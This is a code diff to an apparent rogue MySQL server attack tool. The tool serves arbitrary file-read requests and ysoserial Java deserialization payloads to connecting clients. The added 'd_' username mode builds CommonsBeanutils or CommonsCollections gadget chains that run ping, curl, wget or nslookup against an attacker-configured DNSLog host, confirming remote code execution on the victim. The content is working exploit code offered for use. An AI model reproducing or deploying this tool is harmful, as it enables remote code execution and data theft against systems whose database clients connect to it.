@@ -111,7 +111,7 @@ def handle_server(server_reader, server_writer):
             yield from process_fileread(server_reader, server_writer,fileread_dict[username])
             result = OK(capability, handshake.status)
             #return 
-        elif username not in yso_dict and not username.startswith(b"yso_"):
+        elif username not in yso_dict and not username.startswith(b"yso_") and not username.startswith(b"d_"):
             #query =(yield from packet.read())
             yield from process_fileread(server_reader, server_writer,random.choice(defaultFiles))
             result = OK(capability, handshake.status)
@@ -146,6 +146,15 @@ def handle_server(server_reader, server_writer):
                 EOF(capability, handshake.status).write(server_writer)
                 ResultSet(("11",content,"2333")).write(server_writer)
                 result = EOF(capability, handshake.status)
+            elif username.startswith(b"d_"):
+                query =(yield from packet.read())
+                _,yso_type,dns_type,dnslog_id = username.decode('ascii').split("_")
+                print("Sending DNSLog data with params:%s, %s" % (yso_type, dnslog_dict[dnslog_id]))
+                content = get_yso_dnslog(yso_type,dns_type,dnslog_id)
+                ColumnDefinitionList((ColumnDefinition('a'),ColumnDefinition('b'),ColumnDefinition('c'))).write(server_writer)
+                EOF(capability, handshake.status).write(server_writer)
+                ResultSet(("11",content,"2333")).write(server_writer)
+                result = EOF(capability, handshake.status)
             elif query.decode('ascii') == 'select 1':
                 ColumnDefinitionList((ColumnDefinition('database'),)).write(server_writer)
                 EOF(capability, handshake.status).write(server_writer)
@@ -163,6 +172,31 @@ def handle_server(server_reader, server_writer):
 yso_dict={
 
 }
+dnslog_dict={
+
+}
+
+# d_cb1_p_test:  DNSLog探测，cb1链，使用ping命令
+def get_yso_dnslog(yso_type, dns_type, dnslog_id):
+    if dns_type == 'p':
+        command = "ping -nc 2 " + yso_type + ".ping." + dnslog_dict[dnslog_id]
+    elif dns_type == 'c':
+        command = "curl " + yso_type + ".curl." + dnslog_dict[dnslog_id]
+    elif dns_type == 'w':
+        command = "wget " + yso_type + ".wget." + dnslog_dict[dnslog_id] + " > /dev/null"
+    elif dns_type == 'n':
+        command = "nslookup " + yso_type + ".ns." + dnslog_dict[dnslog_id]
+    else:
+        command = "ping -nc 2 " + yso_type + ".ping." + dnslog_dict[dnslog_id]
+
+    if yso_type.startswith("cb"):
+        yso_type = "CommonsBeanutils" + yso_type[2:]
+    elif yso_type.startswith("cc"):
+        yso_type = "CommonsCollections" + yso_type[2:]
+    else:
+        yso_type = "CommonsBeanutils1"
+    return get_yso_content(yso_type,command)
+
 def get_yso_content(yso_type,command):
     popen = subprocess.Popen([javaBinPath, '-jar', ysoserialPath, yso_type, command], stdout=subprocess.PIPE)
     file_content = popen.stdout.read()
@@ -217,6 +251,11 @@ if __name__ == "__main__":
     if "yso" in data:
         for k,v in data['yso'].items():
             addYsoPaylod(k.encode('ascii'),v[0],v[1])
+
+    if "dnslog" in data:
+        for k,v in data['dnslog'].items():
+            dnslog_dict[k] = v
+
     #print(yso_dict)
     loop = asyncio.get_event_loop()
     f = start_mysql_server(handle_server, host=None, port=3306)
@@ -226,6 +265,8 @@ if __name__ == "__main__":
     print("Load %d Fileread usernames :%s" % (len(fileread_dict),list(fileread_dict.keys())))
     print("Load %d yso usernames :%s" % (len(yso_dict),list(yso_dict.keys())))
     print("Load %d Default Files :%s" % (len(defaultFiles),defaultFiles))
+    print("Load %d DNSLOG :%s" % (len(dnslog_dict),dnslog_dict))
+    print("DNSLOG Usage: d_[cb1|cb2|cc1|...]_[p|w|c|n]_[DNSLOG_ID], such as: d_cb1_p_t1")
     print("Start Server at port 3306")
     loop.run_until_complete(f)
     loop.run_forever()
